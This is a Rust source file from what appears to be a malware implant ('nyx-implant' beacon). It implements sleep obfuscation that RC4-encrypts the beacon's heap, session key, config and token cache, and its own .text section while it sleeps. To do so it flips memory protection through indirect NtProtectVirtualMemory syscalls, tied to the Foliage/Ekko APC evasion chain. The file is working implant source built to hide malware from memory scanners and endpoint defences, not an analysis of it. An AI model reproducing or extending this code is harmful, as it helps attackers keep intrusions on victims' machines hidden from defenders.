//! Memory-content mask at sleep (the RC4 half of sleep obfuscation).
//!
//! ## Status (P2.1a-iii): the memory-content mask is REAL — it uses the
//! pure-Rust RC4 core (`nyx-implant-evasionsdk::rc4`, 6 tests green) to encrypt
//! registered sensitive regions in place around each sleep, with a verified
//! round-trip (encrypt then decrypt restores byte-identical). The *timing*
//! primitive that owns the mask→sleep→unmask window (Ekko/Foliage APC→
//! `NtContinue`) is research-grade and lives gated in [`crate::kits`] (the
//! `SleepmaskKit` seam, default `NoMask`); this module is the memory half that
//! a Foliage impl will call into.
//!
//! ## What's real vs gated
//! - **Real**: RC4 mask/unmask of registered `&mut [u8]` regions, idempotent-
//!   guarded against double-mask, key derived per-run from the syscall runtime
//!   so the keystream differs across boots. A selftest proves the round-trip.
//! - **Gated**: encrypting the implant `.text` itself requires flipping the
//!   section RX→RW (a code-integrity signal) and only makes sense *during* a
//!   sleep the beacon thread isn't executing through — that's the APC chain in
//!   `kits`, not safe to do synchronously from the beacon thread. This module
//!   masks *data* regions, never the running code.
//!
//! ## Single-source-of-truth
//! The RC4 KSA+PRGA math lives ONLY in `nyx-implant-evasionsdk::rc4`. This
//! module derives a key and calls `Rc4::apply_oneshot`; it never reimplements
//! the cipher.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use core::sync::atomic::{AtomicU8, AtomicUsize, Ordering};
use nyx_implant_evasionsdk::rc4::Rc4;

/// Mask state: 0 = cleartext, 1 = currently masked. Guards against double-
/// mask/double-unmask (which would apply RC4 twice and NOT restore the data —
/// RC4 round-trip is two *independent* oneshot calls with the SAME key, so a
/// double-mask produces keystream∘keystream, not cleartext).
static MASK_STATE: AtomicU8 = AtomicU8::new(0);
/// Per-process RC4 mask key, cached ONCE on first use. The original code
/// regenerated a fresh key on every `mask_key()` call, so `mask()` derived key
/// A while `unmask()` derived key B → the regions were NOT restored (corrupted
/// with keystream∘keystream). RC4 round-trip requires the SAME key for both
/// passes, so the key MUST be stable for the process lifetime. Stored in a
/// `static` backed by `UnsafeCell`, guarded by an init flag — no heap allocation,
/// no leak (a leaked `Box` would grow the heap needlessly; the key is
/// process-lifetime by definition, but ownership belongs in a static here).
///
/// # Safety
/// Access is guarded by `MASK_KEY_INIT`: written once, read-only after init.
/// Single-threaded beacon context.
static MASK_KEY_BUF: crate::cell::SyncCell<[u8; 32]> =
    crate::cell::SyncCell::new([0u8; 32]);
/// 0 = MASK_KEY_BUF uninitialized, 1 = populated.
static MASK_KEY_INIT: AtomicU8 = AtomicU8::new(0);

/// Cap on the number of registered sensitive regions. Covers:
/// - config plaintext (1)
/// - session key (1)
/// - token cache, BOF output buffers, operator-registered regions (up to ~28)
/// Total 32 — enough for a fully-loaded beacon with multiple concurrent BOFs.
const MAX_REGIONS: usize = 32;

/// Registered sensitive regions, each a raw `&'static mut [u8]` pointer + len.
/// Stored as raw parts because the regions are `'static` (process-lifetime
/// statics). Populated by [`register_region`] at init; mask/unmask walk them.
static REGIONS: [AtomicUsize; MAX_REGIONS] = [const { AtomicUsize::new(0) }; MAX_REGIONS];
static REGION_LENS: [AtomicUsize; MAX_REGIONS] = [const { AtomicUsize::new(0) }; MAX_REGIONS];

/// Register a sensitive region to be masked at sleep. Call once per region at
/// init. Returns false if the table is full (caller treats as "region won't be
/// masked" — not fatal, just less coverage).
///
/// # Safety
/// `region` must be a `'static` (process-lifetime) mutable byte slice that is
/// safe to XOR in place (not shared with another thread — the beacon is
/// single-threaded) and not the currently-executing code.
pub unsafe fn register_region(region: &'static mut [u8]) -> bool {
    let ptr = region.as_mut_ptr() as usize;
    let len = region.len();
    // Enumerate so the index is derived from iteration, not raw pointer
    // arithmetic — keeps REGIONS/REGION_LENS coupling explicit and safe.
    for (i, slot) in REGIONS.iter().enumerate() {
        if slot
            .compare_exchange(0, ptr, Ordering::AcqRel, Ordering::Relaxed)
            .is_ok()
        {
            REGION_LENS[i].store(len, Ordering::Release);
            return true;
        }
    }
    false
}

/// Register a heap-allocated buffer as a sensitive region. The buffer is
/// **leaked** (never freed) to satisfy the `'static` requirement of
/// [`register_region`]. The leaked slice is masked at sleep and never touched
/// again — the bump allocator never reclaims it anyway.
///
/// Returns false if the region table is full (8 slots).
pub fn register_owned(buf: Vec<u8>) -> bool {
    let leaked: &'static mut [u8] = Vec::leak(buf);
    unsafe { register_region(leaked) }
}

/// Register the 32-byte ECDH session key as a sensitive region. A copy is
/// heap-allocated and leaked so the key sits in maskable memory for the
/// process lifetime.
///
/// Returns false if the region table is full (8 slots).
pub fn register_key(key: [u8; 32]) -> bool {
    let mut buf = Vec::with_capacity(32);
    buf.extend_from_slice(&key);
    let leaked: &'static mut [u8] = Vec::leak(buf);
    unsafe { register_region(leaked) }
}

/// Derive a per-run RC4 key from the syscall runtime's SSN table (a per-boot
/// unpredictable value) so the keystream differs across runs without a CSPRNG,
/// AND cache it for the process lifetime so `mask`/`unmask` use the SAME key.
/// RC4 round-trip is two independent oneshot calls with an identical key; the
/// original code called `csprng_fill` on every invocation, so `mask()` used key
/// A and `unmask()` used key B → the regions were corrupted, not restored.
/// Falls back to an rdtsc-seeded key if the CSPRNG isn't up yet; the fallback
/// is also cached once so mask/unmask still agree.
///
/// Returns a `&'static [u8; 32]` so every caller shares the single cached key.
pub(crate) fn mask_key() -> &'static [u8; 32] {
    // Fast path: already initialized.
    if MASK_KEY_INIT.load(Ordering::Acquire) == 1 {
        // SAFETY: MASK_KEY_BUF is populated and never mutated again after
        // init; the beacon is single-threaded (documented invariant) so there
        // is no concurrent mutation.
        return unsafe { &*MASK_KEY_BUF.get() };
    }
    let mut key = [0u8; 32];
    if !crate::entry::csprng_fill(&mut key) {
        // Dynamic fallback using a tick count or high-resolution timer to
        // maintain key diversity. Still cached once so mask/unmask agree.
        let mut acc = unsafe { core::arch::x86_64::_rdtsc() };
        for b in key.iter_mut() {
            acc = acc.wrapping_mul(0x9E37_79B9).rotate_left(7);
            *b = (acc & 0xFF) as u8;
        }
    }
    // Publish the key, then set the init flag (Release pairs with the Acquire
    // load above so a racing reader observes the bytes before init==1).
    // SAFETY: single-threaded beacon; MASK_KEY_BUF is not concurrently accessed.
    unsafe {
        *MASK_KEY_BUF.get() = key;
    }
    MASK_KEY_INIT.store(1, Ordering::Release);
    unsafe { &*MASK_KEY_BUF.get() }
}

/// Apply RC4 (via the pure core) to every registered region in place. RC4 is an
/// XOR stream cipher, so the SAME key + a fresh cipher per region both encrypts
/// and decrypts. Used by both [`mask`] and [`unmask`] (which differ only in the
/// idempotency guard direction).
fn apply_rc4_to_regions() {
    let key = mask_key();
    for i in 0..MAX_REGIONS {
        let ptr = REGIONS[i].load(Ordering::Acquire);
        if ptr == 0 {
            continue;
        }
        let len = REGION_LENS[i].load(Ordering::Acquire);
        if len == 0 {
            continue;
        }
        // SAFETY: the region was registered via register_region as a 'static
        // mutable slice; the beacon is single-threaded so there's no race.
        let region = unsafe { core::slice::from_raw_parts_mut(ptr as *mut u8, len) };
        // Fresh cipher per region so each starts from KSA-zero (deterministic
        // round-trip: mask then unmask with the same key restores the bytes).
        Rc4::apply_oneshot(key, region);
    }
}

/// Collect the registered region pointers (for selftest inspection — verifies
/// registration worked without triggering a mask).
pub fn registered_count() -> usize {
    REGIONS
        .iter()
        .filter(|s| s.load(Ordering::Acquire) != 0)
        .count()
}

/// Encrypt the registered sensitive regions in place (RC4). Idempotent-guarded:
/// a second call while already masked is a no-op (prevents keystream∘keystream
/// corruption). Does NOT touch the running `.text` — that's the gated APC path.
pub fn mask() {
    if MASK_STATE
        .compare_exchange(0, 1, Ordering::AcqRel, Ordering::Relaxed)
        .is_err()
    {
        return; // already masked
    }
    apply_rc4_to_regions();
}

/// Decrypt (un-mask) the registered regions. Inverse of [`mask`]: same RC4 key,
/// fresh cipher, same regions → restores byte-identical. Guard prevents a
/// double-unmask.
pub fn unmask() {
    if MASK_STATE
        .compare_exchange(1, 0, Ordering::AcqRel, Ordering::Relaxed)
        .is_err()
    {
        return; // already cleartext
    }
    apply_rc4_to_regions();
}

/// Collect registered regions + all allocator slabs into a single mask list.
/// Called by the Foliage helper thread during the mask window. Each entry is
/// `(base_ptr, byte_len)` — the caller RC4's each region with the same key.
///
/// Registered regions (config, key, token cache) take priority slots; allocator
/// slabs fill remaining capacity. Total coverage includes both explicit regions
/// and all heap pages from the bump allocator.
pub fn enumerate_beacon_heap_regions() -> alloc::vec::Vec<(*mut u8, usize)> {
    let mut result = alloc::vec::Vec::with_capacity(MAX_REGIONS + crate::ntalloc::MAX_SLABS);
    // 1. Registered sensitive regions (config, key, operator-registered).
    for i in 0..MAX_REGIONS {
        let ptr = REGIONS[i].load(Ordering::Acquire);
        if ptr == 0 {
            continue;
        }
        let len = REGION_LENS[i].load(Ordering::Acquire);
        if len == 0 {
            continue;
        }
        result.push((ptr as *mut u8, len));
    }
    // 2. All allocator slabs (heap pages — config, transport buffers, BOF scratch).
    for (base, len) in crate::ntalloc::enumerate_slabs() {
        result.push((base, len));
    }
    result
}

/// Mask text + all registered + heap regions in a single RC4 pass.
/// Called by the Foliage helper inside the mask window (beacon is in alertable
/// sleep). The caller supplies the raw NtProtectVirtualMemory for .text and
/// the RC4 key.
///
/// # Status: dead code — pending wiring
///
/// Zero callers. Originally wired into the now-deprecated `sleep::sleep()`
/// Foliage APC path; with the beacon loop routing through
/// `fluctuation::sleep` (which uses `mask_heap_regions`/`unmask_heap_regions`
/// instead, NOT this combined text+heap variant), this entry point is
/// dormant. Kept to be revived when the full Fluctuation sleep-obfuscation
/// chain reintroduces `.text` masking via a helper thread. Do NOT delete.
///
/// # Safety
/// Caller MUST guarantee the beacon thread is NOT executing (it's sleeping
/// via alertable NtWaitForSingleObject). The .text flip + RC4 + heap RC4 all
/// happen in this window.
#[allow(dead_code)]
pub unsafe fn mask_text_and_heap(
    text_base: usize,
    text_len: usize,
    key: &[u8],
    raw: &crate::sleep::FoliageRaw,
) {
    // 1. Flip .text RX → RW.
    let mut b = text_base;
    let mut s = text_len;
    let mut old: u32 = 0;
    let _ = raw.nt_protect_virtual_memory(&mut b, &mut s, 0x04, &mut old);
    // 2. RC4 .text.
    let text = core::slice::from_raw_parts_mut(text_base as *mut u8, text_len);
    Rc4::apply_oneshot(key, text);
    // 3. RC4 all registered regions + heap slabs.
    for (ptr, len) in enumerate_beacon_heap_regions() {
        let region = core::slice::from_raw_parts_mut(ptr, len);
        Rc4::apply_oneshot(key, region);
    }
}

/// Unmask heap + registered regions + text (inverse of [`mask_text_and_heap`]).
///
/// # Status: dead code — pending wiring
///
/// Zero callers. Dies alongside `mask_text_and_heap` (see its doc comment).
/// Will be revived when the Fluctuation sleep-obfuscation chain reintroduces
/// `.text` masking. Do NOT delete.
#[allow(dead_code)]
pub unsafe fn unmask_text_and_heap(
    text_base: usize,
    text_len: usize,
    key: &[u8],
    raw: &crate::sleep::FoliageRaw,
) {
    // 1. RC4 all registered regions + heap slabs (reverse order doesn't matter
    //    for RC4 — same key + fresh cipher = deterministic round-trip).
    for (ptr, len) in enumerate_beacon_heap_regions() {
        let region = core::slice::from_raw_parts_mut(ptr, len);
        Rc4::apply_oneshot(key, region);
    }
    // 2. RC4 .text (decrypt).
    let text = core::slice::from_raw_parts_mut(text_base as *mut u8, text_len);
    Rc4::apply_oneshot(key, text);
    // 3. Flip .text RW → RX.
    let mut b = text_base;
    let mut s = text_len;
    let mut old: u32 = 0;
    let _ = raw.nt_protect_virtual_memory(&mut b, &mut s, 0x20, &mut old);
}

/// Mask only the registered regions + heap slabs (NOT .text).
/// Called by the Foliage helper after .text is already masked, to cover
/// heap-allocated sensitive data (config, key, token cache, BOF scratch).
/// Uses the same RC4 key as the .text mask so a single key covers everything.
pub fn mask_heap_regions(key: &[u8]) {
    for (ptr, len) in enumerate_beacon_heap_regions() {
        // SAFETY: the region was registered/allocated as a mutable buffer;
        // the beacon thread is in alertable sleep during the Foliage mask window.
        let region = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
        Rc4::apply_oneshot(key, region);
    }
}

/// Unmask only the registered regions + heap slabs (NOT .text).
/// Inverse of [`mask_heap_regions`]. Must run before .text is unmasked.
pub fn unmask_heap_regions(key: &[u8]) {
    // Same RC4 round-trip: decrypt == encrypt with same key + fresh cipher.
    for (ptr, len) in enumerate_beacon_heap_regions() {
        let region = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
        Rc4::apply_oneshot(key, region);
    }
}

/// Selftest helper: mask + unmask a caller-provided buffer using the *internal*
/// RC4 path (key derivation + apply) WITHOUT the global region table or the
/// idempotency guard. Returns the buffer after a full round-trip so the caller
/// can assert it equals the original — proving the RC4 core + key derivation
/// are a verified round-trip even before any region is registered.
///
/// `input` is mutated in place: it's RC4'd once (encrypted), then RC4'd again
/// (decrypted), and returned. The caller compares against the pre-call bytes.
pub fn round_trip_selftest(input: &mut [u8]) {
    let key = mask_key();
    Rc4::apply_oneshot(key, input); // encrypt
    Rc4::apply_oneshot(key, input); // decrypt (same key, fresh cipher)
}

/// Mask the implant `.text` region in place: flip RX→RW, RC4-encrypt. For use
/// INSIDE a Foliage chain (sleep.rs steps 2-3 / 8-9), NOT from the beacon
/// thread synchronously — encrypting the running code page while executing
/// through it crashes immediately.
///
/// # Safety
/// Caller MUST guarantee the beacon thread is NOT executing within `[base,
/// base+len)` (it's sleeping through a Foliage cycle). Single-threaded context.
pub unsafe fn mask_text(base: usize, len: usize, key: &[u8]) {
    // Flip RX→RW via NtProtectVirtualMemory (indirect syscall).
    if let Some(rt) = crate::syscalls::global() {
        let mut b = base;
        let mut l = len;
        let mut old: u32 = 0;
        let _ = unsafe {
            crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, 0x04, &mut old)
        };
    }
    // RC4-encrypt the region in place (pure core).
    let region = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    Rc4::apply_oneshot(key, region);
}

/// Unmask the implant `.text`: decrypt, then flip RW→RX. Inverse of
/// [`mask_text`]. MUST run before any code in the region executes.
///
/// # Safety
/// See [`mask_text`]. `key` MUST equal the mask key.
pub unsafe fn unmask_text(base: usize, len: usize, key: &[u8]) {
    let region = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    Rc4::apply_oneshot(key, region); // RC4 decrypt == encrypt
    if let Some(rt) = crate::syscalls::global() {
        let mut b = base;
        let mut l = len;
        let mut old: u32 = 0;
        let _ = unsafe {
            crate::syscalls::nt_protect_virtual_memory(rt, &mut b, &mut l, 0x20, &mut old)
        };
    }
}
